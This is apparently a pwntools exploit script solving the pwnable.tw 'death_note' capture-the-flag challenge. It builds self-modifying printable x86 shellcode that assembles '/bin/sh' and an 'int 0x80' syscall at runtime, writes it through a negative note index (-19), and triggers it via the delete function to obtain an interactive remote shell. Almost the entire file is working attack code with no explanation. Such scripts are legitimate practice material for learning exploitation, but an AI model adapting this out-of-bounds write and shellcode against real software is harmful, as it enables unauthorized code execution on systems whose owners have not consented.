#-*- coding:utf8 -*-
from pwn import *
context(os = 'linux', log_level = 'debug', terminal = ['tmux', 'splitw', '-h'])
#p = process('./death_note')
p = remote('chall.pwnable.tw', 10201)

def Add(index, content):
    p.sendlineafter('Your choice :', '1')
    p.sendlineafter('Index :', str(index))
    p.sendafter('Name :', content)

def Show(index):
    p.sendlineafter('Your choice :', '2')
    p.sendlineafter('Index :', str(index))

def Delete(index):
    p.sendlineafter('Your choice :', '3')
    p.sendlineafter('Index :', str(index))
    
#gdb.attach(p, 'b * 0x08048770\nc\nb * 0x080487c0\nb * 0x08048873\nc 3\nc 3\nsi')
shellcode = asm('''
        /* 计算/bin/sh 13 */
        push 0x2b
        pop ecx
        sub byte ptr [eax+0x44], cl
        sub byte ptr [eax+0x48], cl

        /*计算ebx*/  
        push eax
        pop ecx
        xor al, 0x44
        push eax
        pop ebx

        /* 计算int 0x80 */
        push ecx
        pop eax
        push 0x40
        pop ecx
        sub byte ptr [eax+0x37], cl
        push 0x43
        pop ecx
        sub byte ptr [eax+0x37], cl
        push 0x60
        pop ecx
        sub byte ptr [eax+0x38], cl
        push 0x70
        pop ecx
        sub byte ptr [eax+0x38], cl

        /* 清零ecx, edx 9 */
        push 0x40
        pop eax
        xor al, 0x40
        push eax
        pop ecx
        push eax
        pop edx

        push 0x4b
        pop eax
        xor al, 0x40
        
''')

payload  = shellcode
payload += '\x50'*13
payload += 'ZbinZsh\n'

Add(-19, payload)
Delete(-19)
p.interactive()
